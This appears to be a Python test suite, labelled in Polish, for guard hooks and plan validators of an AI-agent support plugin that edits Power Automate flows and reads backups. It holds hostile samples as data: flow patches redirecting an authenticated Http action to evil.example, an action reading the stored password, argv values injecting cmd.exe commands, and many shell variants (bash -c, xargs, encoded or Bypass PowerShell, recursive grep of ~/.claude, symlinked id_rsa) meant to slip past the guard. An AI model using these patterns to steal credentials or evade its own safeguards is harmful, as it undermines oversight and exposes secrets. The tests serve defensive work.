print("29. 1.2.0 po przegladzie: zaleznosci akcji wysylajacych, typy, zakresy, kroki http i cli, kopie w powloce")
DEF4 = {"properties": {"definition": {"triggers": {}, "actions": {
    "Init_base": {"type": "InitializeVariable", "runAfter": {},
                  "inputs": {"variables": [{"name": "base", "type": "string", "value": "https://api.partner.pl"}]}},
    "Compose_naglowek": {"type": "Compose", "runAfter": {"Init_base": ["Succeeded"]}, "inputs": "Basic abc"},
    "Compose_tekst": {"type": "Compose", "runAfter": {"Init_base": ["Succeeded"]}, "inputs": "Dzien dobry"},
    "I": {"type": "If", "runAfter": {"Compose_naglowek": ["Succeeded"]}, "expression": {"equals": [1, 1]},
          "actions": {}, "else": {"actions": {
              "H2": {"type": "Http", "runAfter": {}, "inputs": {"method": "DELETE", "uri": "https://api.partner.pl/x"}}}}},
    "H": {"type": "Http", "runAfter": {"I": ["Succeeded"]},
          "inputs": {"method": "POST", "uri": "@{variables('base')}/x",
                     "headers": {"Authorization": "@{outputs('Compose_naglowek')}"},
                     "authentication": {"type": "Basic", "username": "u", "password": "p"}, "body": "@{1}"}}}}}}
A4 = ["properties", "definition", "actions"]
expect("zaleznosci: zmienna i Compose uzyte w adresie i naglowkach", C.sensitive_refs(DEF4),
       {("var", "base"), ("act", "compose_naglowek")})


def chain(actions):
    return {"properties": {"definition": {"triggers": {}, "actions": actions}}}


HTTP_ = lambda uri, ra=None: {"type": "Http", "runAfter": ra or {}, "inputs": {"method": "POST", "uri": uri}}  # noqa: E731
for label, actions, target in [
    ("Compose -> Select -> Http", {"Cmp": {"type": "Compose", "inputs": "https://a"},
                                    "Sel": {"type": "Select", "inputs": {"from": "@outputs('Cmp')", "select": "@item()"}},
                                    "H": HTTP_("@{body('Sel')}")}, "cmp"),
    ("Compose -> zmienna -> Http", {"Cmp": {"type": "Compose", "inputs": "https://a"},
                                     "Init": {"type": "InitializeVariable", "inputs": {"variables": [{"name": "u", "value": "@{outputs('Cmp')}"}]}},
                                     "H": HTTP_("@{variables('u')}")}, "cmp"),
    ("Foreach nad Compose, item()", {"Cmp": {"type": "Compose", "inputs": ["https://a"]},
                                      "FE": {"type": "Foreach", "foreach": "@outputs('Cmp')", "actions": {"H": HTTP_("@{item()}")}}}, "cmp"),
    ("wielkosc liter w nazwie zmiennej", {"Init": {"type": "InitializeVariable", "inputs": {"variables": [{"name": "base", "value": "https://a"}]}},
                                           "H": HTTP_("@{variables('BASE')}")}, "init"),
    ("nazwa wyliczana", {"Cmp": {"type": "Compose", "inputs": "x"}, "H": HTTP_("@{variables(concat('ba','se'))}")}, "cmp"),
]:
    d = chain(actions)
    names = {n for n, (_, a) in C.flatten_actions(d["properties"]["definition"]["actions"])[0].items() if n.lower() == target}
    hit = C.sensitive_hit(C.defines(next(iter(names)), C.flatten_actions(d["properties"]["definition"]["actions"])[0][next(iter(names))][1]),
                          C.sensitive_refs(d))
    expect(f"zaleznosci domkniete: {label}", bool(hit), True)
expect("defines: klucze Inputs/Name wielka litera",
       C.defines("S", {"type": "SetVariable", "Inputs": {"Name": "Base", "value": "x"}}), {("act", "s"), ("var", "base")})
expect("result() jako odczyt hasel", bool(C.SECRET_REF_RE.search("@result('Scope')")), True)


def live4(changes, definition=DEF4):
    wf = {"ismanaged": False, "category": 5, "modifiedon": "m", "clientdata": json.dumps(definition)}
    return C.flow_patch_live_problems({"oczekiwany_modifiedon": "m", "zmiany": changes}, wf)[0]


expect("flow-patch: zmienna z adresem Http odrzucona",
       any("akcja wysylajaca" in e for e in live4([{"sciezka": A4 + ["Init_base", "inputs", "variables", "0", "value"],
                                                   "bylo": "https://api.partner.pl", "ma_byc": "https://evil.example"}])), True)
expect("flow-patch: Compose z naglowkiem Http odrzucony",
       any("akcja wysylajaca" in e for e in live4([{"sciezka": A4 + ["Compose_naglowek", "inputs"], "bylo": "Basic abc",
                                                   "ma_byc": "Basic zzz"}])), True)
expect("flow-patch: Compose bez zwiazku z Http dozwolony",
       live4([{"sciezka": A4 + ["Compose_tekst", "inputs"], "bylo": "Dzien dobry", "ma_byc": "Witamy"}]), [])
expect("flow-patch: odczyt wejsc akcji z haslem odrzucony",
       any("authentication" in e for e in live4([{"sciezka": A4 + ["Compose_tekst", "inputs"], "bylo": "Dzien dobry",
                                                  "ma_byc": "@actions('H').inputs.authentication.password"}])), True)
expect("runAfter: status niebedacy tekstem bez wyjatku", bool(C.run_after_problem({"I": [["Succeeded"]]})), True)
expect("runAfter: ostatni klucz pod body to nie runAfter",
       C.flow_patch_problems({"srodowisko": DV, "workflowid": WF3, "oczekiwany_modifiedon": "2026-08-25T09:52:49Z",
                              "zmiany": [{"sciezka": A4 + ["H", "inputs", "body", "runAfter"], "bylo": "a", "ma_byc": "b"}]}, 1)
       == [] or all("runAfter." not in e for e in C.flow_patch_problems(
           {"srodowisko": DV, "workflowid": WF3, "oczekiwany_modifiedon": "2026-08-25T09:52:49Z",
            "zmiany": [{"sciezka": A4 + ["H", "inputs", "body", "runAfter"], "bylo": "a", "ma_byc": "b"}]}, 1)), True)


def fd4(change):
    d = copy.deepcopy(DEF4)
    change(d["properties"]["definition"]["actions"])
    return wf_live(DEF4, d)


for label, change, needle in [
    ("SetVariable ustawiajaca adres", lambda a: a.update(Set_base={"type": "SetVariable", "runAfter": {"Compose_tekst": ["Succeeded"]},
                                                                    "inputs": {"name": "base", "value": "https://evil.example"}}), "akcja wysylajaca"),
    ("zmiana Compose z naglowkiem", lambda a: a["Compose_naglowek"].update(inputs="Basic zzz"), "akcja wysylajaca"),
    ("usuniecie akcji z adresem", lambda a: (a.pop("Init_base"), a["Compose_naglowek"].update(runAfter={}),
                                              a["Compose_tekst"].update(runAfter={})), "akcja wysylajaca"),
    ("Compose czyta haslo", lambda a: a.update(Kradnij={"type": "Compose", "runAfter": {},
                                                        "inputs": "@actions('H').inputs.authentication.password"}), "authentication"),
    ("Type wielka litera", lambda a: a.update(X={"Type": "Http", "runAfter": {}, "inputs": "@json(variables('cfg'))"}), "X"),
    ("dwa klucze typu", lambda a: a["Compose_tekst"].update(Type="Http"), "wielkoscia liter"),
    ("typ spoza listy", lambda a: a.update(J={"type": "JavaScriptCode", "runAfter": {}, "inputs": {"code": "x"}}), "JavaScriptCode"),
    ("akcje jako lista", lambda a: a.update(S={"type": "Scope", "runAfter": {}, "actions": [{"type": "Http"}]}), "S"),
    ("akcje jako tekst w Http", lambda a: a["H"].update(actions="x"), "H"),
    ("zamaskowane haslo w tresci", lambda a: a["Compose_tekst"].update(inputs={"password": "***"}), "***"),
    ("H2 przeniesiona do zakresu o nazwie else", lambda a: (a["I"]["else"]["actions"].pop("H2"), a["I"]["actions"].update(
        {"else": {"type": "Scope", "runAfter": {}, "actions": {"H2": {"type": "Http", "runAfter": {},
                                                                     "inputs": {"method": "DELETE", "uri": "https://api.partner.pl/x"}}}}})), "H2"),
]:
    expect(f"flow-definition odrzuca: {label}", any(needle in e for e in fd4(change)), True)
expect("flow-definition: nowa Compose bez zwiazku z Http dozwolona",
       fd4(lambda a: a.update(Nowa={"type": "Compose", "runAfter": {"Compose_tekst": ["Succeeded"]}, "inputs": "x"})), [])
diff, _ = C.flow_definition_diff(DEF4, (lambda d: (d["properties"]["definition"]["actions"].update(
    Nowa={"type": "Compose", "runAfter": {}, "inputs": "@{formatDateTime(utcNow())}"}), d)[1])(copy.deepcopy(DEF4)))
expect("flow-definition: podglad tresci dodanej akcji", "formatDateTime" in (diff[0].get("podglad") or ""), True)

for label, step, bad in [
    ("PUT workflows/clientdata", {"metoda": "PUT", "url": f"{DV}/api/data/v9.2/workflows({WF3})/clientdata", "body": {"value": "{}"}}, True),
    ("PATCH workflows z clientdata", {"metoda": "PATCH", "url": f"{DV}/api/data/v9.2/workflows({WF3})", "body": {"clientdata": "{}"}}, True),
    ("POST workflows (nowy flow)", {"metoda": "POST", "url": f"{DV}/api/data/v9.2/workflows", "body": {"name": "x"}}, True),
    ("PATCH workflows statecode", {"metoda": "PATCH", "url": f"{DV}/api/data/v9.2/workflows({WF3})", "body": {"statecode": 0, "statuscode": 1}}, False),
    ("$batch", {"metoda": "POST", "url": f"{DV}/api/data/v9.2/$batch", "body": {}}, True),
    ("$batch zakodowany", {"metoda": "POST", "url": f"{DV}/api/data/v9.2/%24batch", "body": {}}, True),
    ("ImportSolution", {"metoda": "POST", "url": f"{DV}/api/data/v9.2/ImportSolution", "body": {}}, True),
    ("korekta rekordu", {"metoda": "PATCH", "url": f"{DV}/api/data/v9.2/eko_units({WF3})", "body": {"eko_meteringpoint@odata.bind": "/eko_meteringpoints(x)"}}, False),
    ("Flow API: nowy flow", {"metoda": "POST", "url": f"https://api.flow.microsoft.com/providers/Microsoft.ProcessSimple/environments/{ENV}/flows?api-version=2016-11-01", "body": {}}, True),
    ("Flow API: PATCH flow", {"metoda": "PATCH", "url": f"https://api.flow.microsoft.com/providers/Microsoft.ProcessSimple/environments/{ENV}/flows/{FLOW}?api-version=2016-11-01", "body": {"properties": {}}}, True),
    ("Flow API: stop", {"metoda": "POST", "url": f"https://api.flow.microsoft.com/providers/Microsoft.ProcessSimple/environments/{ENV}/flows/{FLOW}/stop?api-version=2016-11-01"}, False),
    ("Flow API: resubmit", {"metoda": "POST", "url": f"https://api.flow.microsoft.com/providers/Microsoft.ProcessSimple/environments/{ENV}/flows/{FLOW}/triggers/manual/histories/x/resubmit?api-version=2016-11-01"}, False),
]:
    errs = C.step_problems({"nr": 1, "opis": "x", "typ": "http", **step}, 1)
    expect(f"krok http: {label} {'odrzucony' if bad else 'dozwolony'}", bool(errs), bad)
for argv, bad in [(["pac", "solution", "import", "--path", "x.zip"], True), (["pac", "solution", "upgrade"], True),
                  (["az", "logicapp", "deploy"], True), (["pac", "solution", "list"], False)]:
    expect(f"krok cli: {' '.join(argv)}", bool(C.step_problems({"nr": 1, "opis": "x", "typ": "cli", "argv": argv}, 1)), bad)

INC_DIR = WORK / "zgloszenia" / "FD-1"
for label, cmd, cwd, want in [
    ("cat kopii", "cat zgloszenia/FD-1/backup/x.json", WORK, "deny"),
    ("grep po kopiach", 'grep -r password "zgloszenia/FD-1/backup"', WORK, "deny"),
    ("cp z kopii", "cp zgloszenia/FD-1/backup/x.json zgloszenia/FD-2/", WORK, "deny"),
    ("wzgledna kopia z katalogu zgloszenia", "cat backup/x.json", INC_DIR, "deny"),
    ("z wnetrza backup", "cat x.json", INC_DIR / "backup", "deny"),
    ("ls zgloszenia", "ls zgloszenia/FD-1", WORK, None),
    ("backup w innym projekcie", "ls backup/", OTHER, None),
]:
    (INC_DIR / "backup").mkdir(parents=True, exist_ok=True)
    expect(f"powloka i kopie: {label}", guard_in("sesja-29", "Bash", {"command": cmd}, cwd), want)

cfg["flow_patch_dataverse_urls"] = []
cfg["flow_definition_dataverse_urls"] = []
C.save_config(cfg)

print("30. 1.2.1: odmowy SharePoint z wyjasnieniem (ITS-418)")
P = importlib.reload(P)
P.az_account = lambda: "e2vitservice@ekovoltis.pl"
GSITE = "https://graph.microsoft.com/v1.0/sites/colpro.sharepoint.com:/sites/BazadokumentowEkovoltis"
SECRET_TOKEN = "eyJ0eXAiOiJKV1QiLCJhbGciOi.tajny.podpis"
P.get_token = lambda resource: SECRET_TOKEN
ANSWERS = {GSITE + ":/drive/root:/Rozliczenia niestandardowe/Template:/children": (403, b'{"error": {"code": "accessDenied"}}'),
           "https://colpro.sharepoint.com/sites/BazadokumentowEkovoltis/_api/web": (401, b'{"error": "invalid_request"}'),
           GSITE: (200, b'{"id": "x"}')}
P.http = lambda m, u, b=None, timeout=90, headers=None: ANSWERS.get(u, (404, b"{}"))
for label, url, needle in [("Graph 403 na bibliotece", GSITE + ":/drive/root:/Rozliczenia niestandardowe/Template:/children", "e2vitservice"),
                           ("REST 401", "https://colpro.sharepoint.com/sites/BazadokumentowEkovoltis/_api/web", "przez Graph"),
                           ("Graph 200 bez uwagi", GSITE, None)]:
    buf = io.StringIO()
    with contextlib.redirect_stdout(buf):
        try:
            P.cmd_get([url])
        except SystemExit:
            pass
    text_out = buf.getvalue()
    expect(f"SharePoint: {label}", (needle in text_out) if needle else ("Uwaga:" not in text_out), True)
    expect(f"SharePoint: {label}: bez tokenu", SECRET_TOKEN in text_out, False)
expect("SharePoint: 403 z Dataverse bez uwagi o SharePoint", P.access_hint(f"{DV}/api/data/v9.2/x", 403), None)
expect("SharePoint: 401 z Graph poza witrynami bez uwagi", P.access_hint("https://graph.microsoft.com/v1.0/me", 401), None)

print("31. 1.2.2: kopie definicji w stanie, Read i Grep na stanie, rekurencja od domu, az w kroku cli")
import stat as _stat31  # noqa: E402
cfg["flow_definition_dataverse_urls"] = [DV]
C.save_config(cfg)
KOPIA = sorted(C.backup_dir("FD-1").glob(f"{WF3}-*.json"))[0]
SHA_K = C.file_sha256(KOPIA)
expect("kopie: odnosnik backup/ rozwiazany do stanu",
       C.step_file_path(WORK / "zgloszenia/FD-1", f"backup/{KOPIA.name}"), KOPIA)
expect("kopie: kopia innego zgloszenia po jednoznacznej nazwie",
       C.step_file_path(WORK / "zgloszenia/FD-9", f"backup/{KOPIA.name}"), KOPIA)
text = fd_plan("FD-5", f"backup/{KOPIA.name}", SHA_K)
(WORK / "zgloszenia/FD-5").mkdir(parents=True, exist_ok=True)
(WORK / "zgloszenia/FD-5/plan.md").write_text(text, encoding="utf-8")
expect("kopie: plan z kopia w stanie przechodzi walidacje hooka i ppcall",
       C.check_plan(text, WORK / "zgloszenia/FD-5")[0], [])
accept("FD-5", text)
expect("kopie: hook znajduje kopie w stanie i pyta o exec", decision(f"{Q} exec FD-5 1"), "ask")
bad_text = fd_plan("FD-5", f"backup/{KOPIA.name}", "0" * 64)
(WORK / "zgloszenia/FD-5/plan.md").write_text(bad_text, encoding="utf-8")
expect("kopie: zly skrot kopii -> hook odmawia", decision(f"{Q} exec FD-5 1"), "deny")
expect("kopie: brak kopii -> blad walidacji",
       any("brak pliku" in e for e in C.check_plan(fd_plan("FD-5", f"backup/{WF3}-20200101T000000Z.json", SHA_K),
                                                   WORK / "zgloszenia/FD-5")[0]), True)

print("   przeniesienie kopii sprzed 1.2.2")
LEG = WORK / "zgloszenia/FD-6/backup"
LEG.mkdir(parents=True, exist_ok=True)
leg1 = LEG / f"{WF3}-20261101T100000Z.json"
leg1.write_text('{"properties": {"definition": {"actions": {}}}}', encoding="utf-8")
os.chmod(leg1, _stat31.S_IREAD)
sha_leg = C.file_sha256(leg1)
expect("przejsciowo: odnosnik wskazuje stara kopie, dopoki nie przeniesiona",
       C.step_file_path(WORK / "zgloszenia/FD-6", f"backup/{leg1.name}"), leg1)
expect("przejsciowo: Grep po zgloszeniach ze stara kopia zablokowany",
       guard_in("sesja-31-uspiona", "Grep", {"pattern": "password", "path": str(WORK / "zgloszenia")}, WORK), "deny")
leg2 = LEG / f"{WF3}-20261101T110000Z.json"
leg2.write_text('{"a": 1}', encoding="utf-8")
C.backup_dir("FD-6").mkdir(parents=True, exist_ok=True)
(C.backup_dir("FD-6") / leg2.name).write_text('{"a": 2}', encoding="utf-8")  # konflikt nazwy
with contextlib.redirect_stdout(io.StringIO()):
    left = P.migrate_legacy_backups("FD-6")
moved = C.backup_dir("FD-6") / leg1.name
expect("przeniesienie: kopia w stanie z tym samym skrotem", moved.is_file() and C.file_sha256(moved) == sha_leg, True)
expect("przeniesienie: kopia w stanie tylko do odczytu", not os.stat(moved).st_mode & _stat31.S_IWRITE, True)
expect("przeniesienie: oryginal usuniety", leg1.exists(), False)
expect("przeniesienie: konflikt nazwy zostaje na miejscu", (left, leg2.exists()), ([leg2.name], True))
expect("przeniesienie: po przeniesieniu odnosnik wskazuje stan",
       C.step_file_path(WORK / "zgloszenia/FD-6", f"backup/{leg1.name}"), moved)
leg2.unlink()
with contextlib.redirect_stdout(io.StringIO()):
    P.migrate_legacy_backups("FD-6")
expect("przeniesienie: pusty katalog backup/ usuniety", LEG.exists(), False)
expect("przeniesienie: niepoprawny identyfikator ignorowany", P.migrate_legacy_backups("../x"), [])

print("   nazwy kopii unikalne w calym stanie (wycofanie z innego zgloszenia)")
_now = C.now
C.now = lambda: _now().replace(year=2030, month=1, day=1, hour=0, minute=0, second=0)
try:
    STEP_U = {"workflowid": WF3}
    first = P.backup_path("UNQ-1", STEP_U)
    first.parent.mkdir(parents=True, exist_ok=True)
    first.write_text('{"a": 1}', encoding="utf-8")
    second = P.backup_path("UNQ-2", STEP_U)
finally:
    C.now = _now
expect("kopie: ta sama sekunda w innym zgloszeniu -> inna nazwa", first.name != second.name, True)
twin = C.backup_dir("UNQ-3") / first.name  # kopia sprzed poprawki o tej samej nazwie w innym zgloszeniu
twin.parent.mkdir(parents=True, exist_ok=True)
twin.write_text('{"a": 2}', encoding="utf-8")
expect("kopie: dwie kopie o tej samej nazwie -> wybor po skrocie z planu",
       C.step_file_path(WORK / "zgloszenia/UNQ-9", f"backup/{first.name}", C.file_sha256(twin)), twin)
expect("kopie: dwie kopie o tej samej nazwie bez pasujacego skrotu -> brak",
       C.step_file_path(WORK / "zgloszenia/UNQ-9", f"backup/{first.name}", "0" * 64).is_file(), False)

print("   Read i Grep na stanie (zawsze, takze poza rozmowa dyzurna)")
S31 = "sesja-31-uspiona"
for label, tool, tin, cwd, want in [
    ("Read kopii w stanie", "Read", {"file_path": str(KOPIA)}, OTHER, "deny"),
    ("Read akceptacji", "Read", {"file_path": str(TMP / "state/akceptacje/FD-5.json")}, OTHER, "deny"),
    ("Read rejestru kopii", "Read", {"file_path": str(TMP / "state/kopie.jsonl")}, OTHER, "deny"),
    ("Read zwyklego pliku", "Read", {"file_path": str(WORK / "zgloszenia/FD-5/plan.md")}, OTHER, None),
    ("Read wzgledny z wnetrza stanu", "Read", {"file_path": "kopie.jsonl"}, TMP / "state", "deny"),
    ("Grep w kopiach", "Grep", {"pattern": "password", "path": str(C.backup_dir("FD-1"))}, OTHER, "deny"),
    ("Grep od przodka stanu", "Grep", {"pattern": "password", "path": str(TMP)}, OTHER, "deny"),
    ("Grep bez sciezki z cwd w stanie", "Grep", {"pattern": "password"}, TMP / "state", "deny"),
    # inne sekcje zostawiaja stare katalogi backup/ w zgloszenia/, wiec Grep po calosci jest tu blokowany
    ("Grep w zgloszeniu (kopie w stanie)", "Grep", {"pattern": "password", "path": str(WORK / "zgloszenia/FD-5")}, WORK, None),
    ("Grep w projekcie", "Grep", {"pattern": "def ", "path": str(ROOT / "scripts")}, OTHER, None),
]:
    expect(f"narzedzia: {label}", guard_in(S31, tool, tin, cwd), want)

print("   rekurencja od domu albo .claude w rozmowie dyzurnej")
S31A = "sesja-31-dyzur"
guard_in(S31A, "Skill", {"skill": "pp-support:zgloszenie"})
for label, tool, cmd, cwd, want in [
    ("grep -r od przodka stanu", "Bash", f'grep -r password "{TMP}"', WORK, "deny"),
    ("grep -rn ze wzorcem", "Bash", f'grep -rn password "{TMP}"/st*', WORK, "deny"),
    ("find od przodka stanu", "Bash", f'find "{TMP}" -name "*.json"', WORK, "deny"),
    ("tar katalogu nad stanem", "Bash", f'tar czf x.tgz "{TMP}"', WORK, "deny"),
    ("rg z cwd nad stanem", "Bash", "rg password", TMP, "deny"),
    ("Get-ChildItem -Recurse", "PowerShell", f'Get-ChildItem "{TMP}" -Recurse | Select-String password', WORK, "deny"),
    ("gci -r", "PowerShell", f'gci -r "{TMP}"', WORK, "deny"),
    ("grep -r w projekcie", "Bash", "grep -r password zgloszenia/FD-5", WORK, None),
    ("grep bez rekurencji", "Bash", f'grep password "{TMP}/x.txt"', WORK, None),
    ("ls -la nad stanem", "Bash", f'ls -la "{TMP}"', WORK, None),
]:
    expect(f"rekurencja: {label}", guard_in(S31A, tool, {"command": cmd}, cwd), want)
expect("rekurencja: poza rozmowa dyzurna bez blokady",
       guard_in(S31, "Bash", {"command": f'grep -r password "{TMP}"'}, WORK), None)
_saved_state = os.environ["PP_SUPPORT_STATE_DIR"]
os.environ["PP_SUPPORT_STATE_DIR"] = str(Path.home() / ".claude" / C.STATE_DIR_NAME)
try:
    for label, cmd, dialect, want in [
        ("grep -r ~", "grep -r password ~", "bash", True),
        ("find $HOME", "find $HOME -name x", "bash", True),
        ("rg ~/.claude", "rg --hidden password ~/.claude", "bash", True),
        ("tar ~/.c*", "tar czf x.tgz ~/.c*", "bash", True),
        ("gci $env:USERPROFILE\\.claude", "Get-ChildItem $env:USERPROFILE\\.claude -Recurse", "powershell", True),
        ("Compress-Archive ~", "Compress-Archive -Path ~ -DestinationPath x.zip", "powershell", True),
        ("grep -r ~/projekt", "grep -r password ~/projekt", "bash", False),
        ("find ~/.claude/plugins", "find ~/.claude/plugins -name x", "bash", False),
    ]:
        expect(f"rekurencja od domu: {label}", G.recursive_reaches_state(G.tokenize(cmd, dialect), str(WORK)), want)
finally:
    os.environ["PP_SUPPORT_STATE_DIR"] = _saved_state

print("   krok cli z az: tylko jawnie dozwolone polecenia")
for argv, bad in [
    (["az", "logic", "workflow", "update", "-g", "rg", "-n", "wf", "--definition", "d.json"], True),
    (["az", "logic", "workflow", "create", "-g", "rg", "-n", "wf"], True),
    (["az", "webapp", "config", "appsettings", "set", "-n", "x", "-g", "y", "--settings", "A=1"], True),
    (["az", "resource", "update", "--ids", "x", "--set", "properties.state=Enabled"], True),
    (["az", "role", "assignment", "create", "--role", "Owner"], True),
    (["az", "--subscription", "s", "webapp", "restart", "-n", "x", "-g", "y"], True),
    (["az", "webapp", "restart", "-n", "@plik", "-g", "y"], True),
    (["az", "webapp", "restart", "--name=@plik", "-g", "y"], True),
    (["az", "logic", "workflow", "enable", "-g", "rg", "-n", "wf"], False),
    (["az", "logic", "workflow", "disable", "-g", "rg", "-n", "wf"], False),
    (["az", "webapp", "restart", "-n", "x", "-g", "y"], False),
    (["az", "functionapp", "restart", "-n", "x", "-g", "y"], False),
    (["pac", "solution", "list"], False),
]:
    expect(f"krok cli: {' '.join(argv)}", bool(C.step_problems({"nr": 1, "opis": "x", "typ": "cli", "argv": argv}, 1)), bad)
_http_step = ('"typ": "http", "metoda": "POST",\n   "url": "https://api.flow.microsoft.com/providers/Microsoft.ProcessSimple/'
              'environments/env1/flows/abc/start?api-version=2016-11-01"')
bad_plan = PLAN.replace(_http_step, '"typ": "cli", "argv": ["az", "logic", "workflow", "update", "-g", "rg", "-n", "wf", '
                                    '"--definition", "d.json"]')
expect("krok cli: plan z az update nie przechodzi plan-check", bad_plan != PLAN and bool(C.check_plan(bad_plan)[0]), True)
cfg["flow_definition_dataverse_urls"] = []
C.save_config(cfg)

print("   po przegladzie 1.2.2: kopie we wzorcach, cd, nakladki, cmd.exe, dowiazania, dziennik")
for label, cmd, want in [
    ("cd ~/.claude i wzorzec na kopie", "cd ~/.claude && cat */kopie/*/*.json", "deny"),
    ("dopisanie do rejestru kopii wzorcem", "cd ~/.claude && echo x >> */kopie.jsonl", "deny"),
    ("Set-Location i wzorzec na kopie", "Set-Location ~/.claude; Get-Content */kopie/*/*", "deny"),
    ("slowo kopie bez odniesienia do domu", "ls kopie/", None),
]:
    dialect_tool = "PowerShell" if cmd.startswith("Set-Location") else "Bash"
    expect(f"kopie we wzorcach: {label}", guard_in(S31, dialect_tool, {"command": cmd}, WORK), want)
_saved_state = os.environ["PP_SUPPORT_STATE_DIR"]
os.environ["PP_SUPPORT_STATE_DIR"] = str(Path.home() / ".claude" / C.STATE_DIR_NAME)
try:
    for label, cmd, dialect, want in [
        ("cd ~ && grep -rn .", "cd ~ && grep -rn pw .", "bash", True),
        ("samo cd i grep -r", "cd; grep -r pw .", "bash", True),
        ("Set-Location i gci -Recurse", "Set-Location ~\\.claude; Get-ChildItem -Recurse", "powershell", True),
        ("command grep -r", "command grep -r pw ~", "bash", True),
        ("timeout find", "timeout 10 find ~ -name x", "bash", True),
        ("env grep -r", "env LC_ALL=C grep -r pw ~", "bash", True),
        ("xargs grep -r", "echo ~ | xargs grep -r pw", "bash", True),
        ("cmd /c z cudzyslowem", 'cmd /c "dir /s %USERPROFILE%\\.claude"', "bash", True),
        ("cmd /c dir /s w PowerShell", "cmd /c dir /s %USERPROFILE%\\.claude", "powershell", True),
        ("gci -Depth", "Get-ChildItem ~ -Depth 10", "powershell", True),
        ("${env:USERPROFILE}", "Get-ChildItem -Path ${env:USERPROFILE} -Recurse", "powershell", True),
        ("-Path:$HOME", "Get-ChildItem -Path:$HOME -Recurse", "powershell", True),
        ("grep --directories=recurse", "grep --directories=recurse pw ~/.claude", "bash", True),
        ("grep -d recurse", "grep -d recurse pw ~", "bash", True),
        ("ls -ltr ~ w bashu", "ls -ltr ~", "bash", False),
        ("ls -R ~ w bashu", "ls -R ~", "bash", True),
        ("cd do projektu i grep -r", "cd ~/projekt && grep -r pw .", "bash", False),
        ("bash -c z grep -r", 'bash -c "grep -r pw ~"', "bash", True),
        ("pwsh -Command z gci -Recurse", 'pwsh -Command "Get-ChildItem ~ -Recurse"', "powershell", True),
        ("powershell -EncodedCommand", "powershell -EncodedCommand ZABpAHIA", "powershell", True),
        ("bash -c bez rekurencji", 'bash -c "ls ~"', "bash", False),
        ("powershell bez -Command", "powershell Get-ChildItem ~ -Recurse", "powershell", True),
        ("pwsh -NoProfile -c", 'pwsh -NoProfile -c "gci -r ~"', "powershell", True),
        ("bash skrypt", "bash skrypt.sh", "bash", False),
        ("powershell -ExecutionPolicy Bypass -Command", 'powershell -ExecutionPolicy Bypass -Command "gci ~ -Recurse"', "powershell", True),
        ("powershell -ep Bypass bez -Command", "powershell -ep Bypass Get-ChildItem ~ -Recurse", "powershell", True),
        ("powershell skrot -Execution", "powershell -Execution Bypass gci -r ~", "powershell", True),
        ("powershell nieznana opcja", "powershell -Cos gci -r ~", "powershell", True),
        ("pwsh -NoProfile -File", "pwsh -NoProfile -File skrypt.ps1", "powershell", False),
        ("powershell -wd ~ -c", 'powershell -wd ~ -c "gci -r ."', "powershell", True),
        ("pwsh -WorkingDirectory:~/.claude", 'pwsh -WorkingDirectory:~/.claude -Command "gci -Recurse"', "powershell", True),
        ("pwsh -File - (stdin)", "pwsh -File -", "powershell", True),
        ("pwsh -Command - (stdin)", "pwsh -Command -", "powershell", True),
        ("echo | bash (stdin)", 'echo "grep -r x ~" | bash', "bash", True),
        ("bash -s < plik", "bash -s < cmd.txt", "bash", True),
        ("bash -o pipefail -c", 'bash -o pipefail -c "grep -r x ~"', "bash", True),
        ("bash skrypt z -c w argumentach", "bash skrypt.sh -c x", "bash", False),
        ("bash +o pipefail -c", 'bash +o pipefail -c "grep -r x ~"', "bash", True),
        ("bash -so pipefail (stdin)", "echo 'grep -r x ~' | bash -so pipefail x", "bash", True),
        ("bash -co", 'bash -co pipefail "grep -r x ~"', "bash", True),
        ("bash -oc", 'bash -oc pipefail "grep -r x ~"', "bash", True),
        ("bash -eoc", 'bash -eoc pipefail "grep -r x ~"', "bash", True),
        ("bash -eo pipefail -c", 'bash -eo pipefail -c "grep -r x ~"', "bash", True),
        ("powershell /wd ~", 'powershell /wd ~ /c "gci -r ."', "powershell", True),
        ("powershell /WorkingDirectory:~", 'powershell /WorkingDirectory:~ -Command "gci -r ."', "powershell", True),
    ] + ([("find /c", "find /c -name x", "bash", True),  # dysk w Git Bash i cmd (tylko Windows)
          ("grep -r C:", "grep -r x C:", "bash", True)] if os.name == "nt" else []):
        toks = G.tokenize(G.split_segments(cmd, dialect)[-1].strip(), dialect)
        expect(f"rekurencja po przegladzie: {label}", G.recursive_reaches_state(toks, str(WORK), dialect, cmd), want)
finally:
    os.environ["PP_SUPPORT_STATE_DIR"] = _saved_state
for argv, bad in [
    (["az", "webapp", "restart", "-n", "x&calc", "-g", "y"], True),
    (["az", "webapp", "restart", "-n", "x", "-g", "y|more"], True),
    (["az", "webapp", "restart", "-n", "%COMSPEC%", "-g", "y"], True),
    (["az", "webapp", "restart", "-n", 'x" & calc & "', "-g", "y"], True),
    (["az", "webapp", "restart", "--%", "-n", "x"], True),
    (["pac", "org", "select", "--environment", "https://x.crm4.dynamics.com/"], False),
]:
    expect(f"krok cli (cmd.exe): {' '.join(argv)}",
           bool(C.step_problems({"nr": 1, "opis": "x", "typ": "cli", "argv": argv}, 1)), bad)

VICTIM = TMP / "cudzy-katalog"
VICTIM.mkdir(exist_ok=True)
(VICTIM / "id_rsa").write_text("tajne", encoding="utf-8")
LINK_DIR = WORK / "zgloszenia/MIG-2"
LINK_DIR.mkdir(parents=True, exist_ok=True)
linked = False
try:
    if os.name == "nt":
        linked = subprocess.run(["cmd", "/c", "mklink", "/J", str(LINK_DIR / "backup"), str(VICTIM)],
                                capture_output=True).returncode == 0
    else:
        os.symlink(VICTIM, LINK_DIR / "backup")
        linked = True
except OSError:
    linked = False
if linked:
    with contextlib.redirect_stdout(io.StringIO()):
        P.migrate_legacy_backups("MIG-2")
    expect("migracja: dowiazanie backup/ pominiete", ((VICTIM / "id_rsa").exists(),
                                                      (C.backup_dir("MIG-2") / "id_rsa").exists()), (True, False))
    if os.name == "nt":
        subprocess.run(["cmd", "/c", "rmdir", str(LINK_DIR / "backup")], capture_output=True)
    else:
        (LINK_DIR / "backup").unlink()
    VICTIM2 = TMP / "cudze-zgloszenie"
    (VICTIM2 / "backup").mkdir(parents=True, exist_ok=True)
    (VICTIM2 / "backup" / "id_rsa").write_text("tajne", encoding="utf-8")
    LINK_INC = WORK / "zgloszenia/MIG-4"
    if os.name == "nt":
        subprocess.run(["cmd", "/c", "mklink", "/J", str(LINK_INC), str(VICTIM2)], capture_output=True)
    else:
        os.symlink(VICTIM2, LINK_INC)
    with contextlib.redirect_stdout(io.StringIO()):
        P.migrate_legacy_backups("MIG-4")
    expect("migracja: dowiazanie katalogu zgloszenia pominiete",
           ((VICTIM2 / "backup" / "id_rsa").exists(), (C.backup_dir("MIG-4") / "id_rsa").exists()), (True, False))
